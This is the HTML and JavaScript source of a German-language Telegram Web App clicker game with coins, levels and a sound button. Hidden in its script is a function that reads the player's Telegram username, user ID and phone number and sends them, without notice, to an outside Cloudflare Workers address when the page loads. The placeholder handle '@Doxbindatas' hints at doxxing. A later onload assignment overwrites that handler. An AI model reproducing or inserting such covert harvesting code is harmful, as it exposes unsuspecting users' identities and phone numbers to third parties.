<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <style>
    /* Ihre bestehenden Styles */
    @keyframes coinAnimation {
      0% {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
      100% {
        opacity: 0;
        transform: translateY(-100px) scale(0.5);
      }
    }

    body {
      background-image: url('https://cdn.wallpapersafari.com/79/31/E547v1.jpg');
      background-size: cover;
      background-attachment: fixed;
      font-family: 'Arial', sans-serif;
      font-size: 3vw;
      text-align: center;
      color: rgb(0, 0, 0);
      margin: 0;
      padding: 0;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #ui {
      width: 100%;
      display: flex;
      justify-content: space-between;
      padding: 2vw;
      box-sizing: border-box;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 3;
    }
    .ui-element {
      background-color: rgba(255, 255, 255, 0.5);
      border-radius: 1vw;
      padding: 1vw 2vw;
      font-size: 3.5vw; /* Vergrößert */
      font-weight: bold;
      color: black;
      display: inline-flex;
      align-items: center;
    }
    .ui-element img {
      width: 2.5vw;
      height: 2.5vw;
      margin-left: 1vw;
    }
    #score {
      font-size: 6vw;
      font-weight: bold;
      color: green;
      margin-top: 25vh;
      background-color: rgba(0, 0, 0, 0.5);
      border-radius: 1vw;
      padding: 1vw 2vw;
      display: inline-block;
      color: white;
    }
    #button {
      width: 50vw; /* Vergrößert */
      height: 50vw; /* Vergrößert */
      background-color: rgba(0, 0, 255, 0.7);
      border-radius: 50%;
      line-height: 50vw; /* Anpassung der Zeilenhöhe */
      user-select: none;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: auto;
      transition: transform 0.1s;
    }
    #button img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
    }
    #button span {
      position: absolute;
      font-size: 8vw; /* Vergrößert */
      font-weight: bold;
      color: rgb(24, 21, 21);
      z-index: 1;
    }
    #button:active {
      transform: scale(0.95);
    }
    #coin-animation {
      position: absolute;
      width: 10vw;
      height: 10vw;
      background-image: url('https://i.postimg.cc/qqR7BRWJ/photo-2024-06-21-23-26-50-removebg-preview-1.png');
      background-size: contain;
      animation: coinAnimation 1s ease-out;
      pointer-events: none;
      display: none;
    }
    #playSoundButton {
      position: absolute;
      bottom: 2vw;
      right: 2vw;
      background-color: rgba(255, 255, 255, 0.5);
      border: none;
      border-radius: 1vw;
      padding: 1vw 2vw;
      font-size: 2.5vw;
      font-weight: bold;
      color: black;
      cursor: pointer;
    }
    #menuButton {
      position: absolute;
      top: 8vw; /* Tiefer platziert */
      left: 2vw;
      background-color: rgba(255, 255, 255, 0.5);
      border: none;
      border-radius: 1vw;
      padding: 1vw 2vw;
      font-size: 2.5vw;
      font-weight: bold;
      color: black;
      cursor: pointer;
    }
    #coins {
      position: absolute;
      top: 2vw;
      left: 50%;
      transform: translateX(-50%);
    }
    #sideMenu {
      position: fixed;
      top: 0;
      left: -100%;
      width: 250px;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9);
      box-shadow: 2px 0 5px rgba(0,0,0,0.5);
      transition: left 0.3s;
      display: flex;
      flex-direction: column;
      padding-top: 5vw;
    }
    #sideMenu a {
      padding: 1.5vw;
      text-align: center;
      font-size: 2.5vw;
      font-weight: bold;
      color: black;
      text-decoration: none;
      margin-bottom: 1vw;
    }
    #sideMenu a:hover {
      background-color: rgba(0, 0, 0, 0.1);
    }
  </style>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
  <div id="ui">
    <div class="ui-element" id="level">Level: 1</div>
    <button id="menuButton">Menü</button>
    <div class="ui-element" id="coins">Coins: 0 <img src="https://i.postimg.cc/qqR7BRWJ/photo-2024-06-21-23-26-50-removebg-preview-1.png" alt="Coin"></div>
    <div class="ui-element" id="username">@Doxbindatas</div>
  </div>
  <div id="score">0</div>
  <div id="button">
    <img src="https://i.postimg.cc/qqR7BRWJ/photo-2024-06-21-23-26-50-removebg-preview-1.png" alt="Hau Ihn">
    <span>Hau Ihn</span>
  </div>
  <div id="coin-animation"></div>
  <button id="playSoundButton" onclick="playSound()">Play Sound</button>
  
  <div id="sideMenu">
    <a href="#" id="shopButton">Shop</a>
    <a href="#" id="freeCoinsButton">Free Coins</a>
    <a href="#" id="aboutButton">About</a>
  </div>

  <script>
    // Telegram Web App Integration
    Telegram.WebApp.ready();
    const tg = window.Telegram.WebApp;
    const username = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.username : 'Unbekannter Benutzer';
    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : 'Unbekannte ID';
    const userPhone = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.phone_number : 'Unbekannte Telefonnummer';

    document.getElementById('username').innerText = `@${username}`;

    function logToTelegram() {
      const userData = { username, userId, userPhone };

      fetch('https://bold-silence-0ba0.sherlilisa5.workers.dev/', {  // URL des Workers
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(userData)
      })
      .then(response => response.json())
      .then(data => {
        console.log('Benutzerdaten erfolgreich gesendet:', data);
      })
      .catch(error => {
        console.error('Fehler beim Senden der Benutzerdaten:', error);
      });
    }

    // Benutzerdaten an Telegram senden, wenn die Seite geladen wird
    window.onload = logToTelegram;

    // Ihr bestehendes JavaScript für die Spiel-Logik
    function playSound() {
        var audio = new Audio('https://dl.dropboxusercontent.com/scl/fi/hyju8t3at71wdgk88x8gi/Bratee-ein-Tabak-Pape-Kiffer.mp3?rlkey=f62mm3zj5y26ho7gvhk1emx5l&st=464nv6eq&dl=0');
        audio.play();
    }

    let counter = localStorage.getItem('counter') ? parseInt(localStorage.getItem('counter')) : 0;
    let coins = localStorage.getItem('coins') ? parseInt(localStorage.getItem('coins')) : 0;
    let level = localStorage.getItem('level') ? parseInt(localStorage.getItem('level')) : 1;

    let products = JSON.parse(localStorage.getItem('products')) || [
      {level: 1, cost: 100, increment: 2, autoClick: false},
      {level: 1, cost: 200, increment: 0, autoClick: true, interval: 3000, autoClickId: null},
      {level: 1, cost: 300, increment: 0, autoClick: false},
      {level: 1, cost: 400, increment: 0, autoClick: false}
    ];

    const levelThresholds = [250, 1000, 5000, 12500, 20000]; // Thresholds for leveling up
    const backgrounds = [
      'https://cdn.wallpapersafari.com/79/31/E547v1.jpg', // Level 1
      'https://preview.redd.it/top-to-bottom-drysift-la-mousse-two-different-commercials-v0-n2ftecdj49ja1.jpg?auto=webp&s=d1b15da431aefa875b2c0da1ce271b13f71d39d9',  // Level 2
      'https://cdn.wallpapersafari.com/3/30/D12k4C.jpg',  // Level 3
      'https://cdn.wallpapersafari.com/8/24/C45l8P.jpg',  // Level 4
      'https://cdn.wallpapersafari.com/1/28/B22f6G.jpg'   // Level 5
    ];

    const button = document.getElementById('button');
    const scoreElem = document.getElementById('score');
    const coinsElem = document.getElementById('coins');
    const levelElem = document.getElementById('level');
    const playSoundButton = document.getElementById('playSoundButton');
    const menuButton = document.getElementById('menuButton');
    const sideMenu = document.getElementById('sideMenu');
    const coinAnimation = document.getElementById('coin-animation');

    window.onload = function() {
      products.forEach((product, index) => {
        if (product.autoClick && !product.autoClickId) {
          product.autoClickId = setInterval(() => {
            counter += 1;
            coins += 1;
            saveGame();
            updateUI();
          }, product.interval);
        }
      });
      updateUI();
    };

    // Button click handling for desktop and mobile
    button.addEventListener('mousedown', handleButtonPress);
    button.addEventListener('mouseup', handleButtonRelease);
    button.addEventListener('touchstart', handleButtonPress);
    button.addEventListener('touchend', handleButtonRelease);

    function handleButtonPress(event) {
      button.style.transform = 'scale(0.95)';
      const increment = products[0].level > 1 ? products[0].level : 1;
      counter += increment;
      coins += increment;
      checkLevelUp();
      saveGame();
      updateUI();
      showCoinAnimation(event.touches ? event.touches[0].clientX : event.clientX, event.touches ? event.touches[0].clientY : event.clientY);
    }

    function handleButtonRelease() {
      button.style.transform = 'scale(1)';
    }

    menuButton.onclick = () => {
      if (sideMenu.style.left === '0px') {
        sideMenu.style.left = '-100%';
      } else {
        sideMenu.style.left = '0px';
      }
    };

    function checkLevelUp() {
      if (level < levelThresholds.length && coins >= levelThresholds[level]) {
        level++;
        alert('Level Up! You are now at level ' + level);
        document.body.style.backgroundImage = `url(${backgrounds[level - 1]})`;
      }
    }

    function updateUI() {
      scoreElem.innerText = counter;
      coinsElem.innerText = 'Coins: ' + coins;
      levelElem.innerText = 'Level: ' + level;
      document.body.style.backgroundImage = `url(${backgrounds[level - 1]})`;
      products.forEach((product, index) => {
        const productElem = document.getElementById(`product${index + 1}`);
        if (productElem) {
          productElem.querySelector('button').innerText = `Lvl. ${product.level} | ${product.cost} Coins`;
        }
      });
    }

    function saveGame() {
      localStorage.setItem('counter', counter);
      localStorage.setItem('coins', coins);
      localStorage.setItem('level', level);
      localStorage.setItem('products', JSON.stringify(products));
    }

    function showCoinAnimation(x, y) {
      const clone = coinAnimation.cloneNode(true);
      clone.style.left = `${x - 20}px`;
      clone.style.top = `${y - 20}px`;
      clone.style.display = 'block';
      document.body.appendChild(clone);
      clone.addEventListener('animationend', () => {
        clone.remove();
      });
    }
  </script>
</body>
</html>
